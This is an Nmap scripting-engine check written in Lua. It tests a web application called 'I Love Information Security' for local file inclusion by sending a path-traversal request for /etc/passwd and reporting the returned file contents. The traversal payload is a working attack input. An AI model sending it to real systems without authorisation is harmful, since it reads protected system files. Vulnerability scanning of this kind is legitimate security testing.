local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local vulns = require "vulns"

description = [[
This script detects the LFI vulnerability in I Love Information Security.
]]
categories = {"intrusive", "vuln", "exploit"}
author = "Wai Tuck <waituck@edgis-security.org"
license = "Same as Nmap---See https://nmap.org/book/man-legal.html"
portrule = shortport.http

action = function(host, port)
  local vuln_path = "?page=../../../../etc/passwd"
  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln_table = {
    title = "LFI vulnerability in I Love Information Security",
    extra_info= {}
  }
  local response = http.get(host, port, vuln_path)
  if response and response.status == 200 and response.body:match("root:") then
    vuln_table.state = vulns.STATE.VULN
    table.insert(vuln_table.extra_info, response.body)
  else
    vuln_table.state = vulns.STATE.NOT_VULN
  end
  return report:make_output(vuln_table)
end
